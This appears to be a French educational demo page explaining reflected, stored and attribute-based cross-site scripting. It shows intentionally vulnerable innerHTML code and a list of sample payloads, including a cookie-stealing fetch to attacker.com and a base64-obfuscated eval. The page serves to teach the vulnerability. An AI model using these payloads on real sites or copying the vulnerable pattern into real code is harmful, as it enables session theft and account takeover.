Qu'est-ce que XSS?

Cross-Site Scripting (XSS) permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs.

Test 1: Reflected XSS (DOM-based)

Le code injecté est immédiatement affiché sans validation.

Code vulnérable:
document.getElementById('output').innerHTML = input.value;

Test 2: Stored XSS Simulation

Le commentaire est "stocké" (localStorage) et affiché à tous les visiteurs.



Problème:
Les commentaires sont affichés avec innerHTML sans sanitisation

Test 3: XSS via attribut

Injection dans un attribut HTML.

Charger l'image
Code vulnérable:
img.innerHTML = '<img src="' + url + '">';

Exemples d'Attaques XSS

1. Alert basique:
<script>alert('XSS')</script>

2. Vol de cookies:
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>

3. Via img onerror:
<img src=x onerror=alert('XSS')>

4. Via événement:
<body onload=alert('XSS')>

5. Encodage:
<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>

Pourquoi c'est dangereux?

  • 🔓 Vol de cookies de session
  • 🎭 Usurpation d'identité
  • 📝 Modification de la page
  • 🔑 Vol de mots de passe
  • 📱 Phishing ciblé
  • 🦠 Propagation de malware
